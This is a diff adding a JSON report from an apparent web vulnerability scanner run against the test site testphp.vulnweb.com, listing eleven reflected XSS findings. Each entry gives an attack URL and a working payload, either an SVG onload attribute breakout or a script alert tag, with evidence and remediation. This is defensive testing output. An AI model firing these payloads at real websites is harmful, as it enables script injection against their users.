@@ -1,0 +1,152 @@
+{
+  "scan_summary": {
+    "target_url": "http://testphp.vulnweb.com/",
+    "scan_start_time": "2025-08-13T14:51:58+07:00",
+    "scan_end_time": "2025-08-13T14:52:44+07:00",
+    "total_duration": "46s",
+    "scanners_run": [
+      "xss"
+    ],
+    "technologies_detected": {
+      "WebServer": "nginx/1.19.0",
+      "X-Powered-By": "PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1"
+    },
+    "total_urls_discovered": 56,
+    "total_parameterized_requests": 0,
+    "total_vulnerabilities_found": 11
+  },
+  "vulnerabilities": [
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/?id=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS888011159%3E",
+      "Parameter": "id",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS888011159\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS888011159\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/?id=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS510641788%3E",
+      "Parameter": "id",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS510641788\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS510641788\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/color-printer/3/?id=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS77553209%3E",
+      "Parameter": "id",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS77553209\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS77553209\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/RateProduct-1.html?id=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS976572483%3E",
+      "Parameter": "id",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS976572483\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS976572483\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/listproducts.php?artist=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS413442654%3E",
+      "Parameter": "artist",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS413442654\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS413442654\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/hpp/?pp=%3Cscript%3Ealert%28%27DursgoXSS158318401%27%29%3C%2Fscript%3E",
+      "Parameter": "pp",
+      "Payload": "\u003cscript\u003ealert('DursgoXSS158318401')\u003c/script\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'HTML' context. Description: Basic script tag injection",
+      "severity": "high",
+      "evidence": "\u003cscript\u003ealert('DursgoXSS158318401')\u003c/script\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/product.php?pic=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS350420207%3E",
+      "Parameter": "pic",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS350420207\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS350420207\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/?id=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS907779310%3E",
+      "Parameter": "id",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS907779310\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS907779310\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/artists.php?artist=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS98772557%3E",
+      "Parameter": "artist",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS98772557\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS98772557\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/hpp/params.php?p=%3Cscript%3Ealert%28%27DursgoXSS541398751%27%29%3C%2Fscript%3E\u0026pp=12",
+      "Parameter": "p",
+      "Payload": "\u003cscript\u003ealert('DursgoXSS541398751')\u003c/script\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'HTML' context. Description: Basic script tag injection",
+      "severity": "high",
+      "evidence": "\u003cscript\u003ealert('DursgoXSS541398751')\u003c/script\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://testphp.vulnweb.com/hpp/params.php?p=valid\u0026pp=%3Cscript%3Ealert%28%27DursgoXSS14080931%27%29%3C%2Fscript%3E",
+      "Parameter": "pp",
+      "Payload": "\u003cscript\u003ealert('DursgoXSS14080931')\u003c/script\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'HTML' context. Description: Basic script tag injection",
+      "severity": "high",
+      "evidence": "\u003cscript\u003ealert('DursgoXSS14080931')\u003c/script\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    }
+  ]
+}
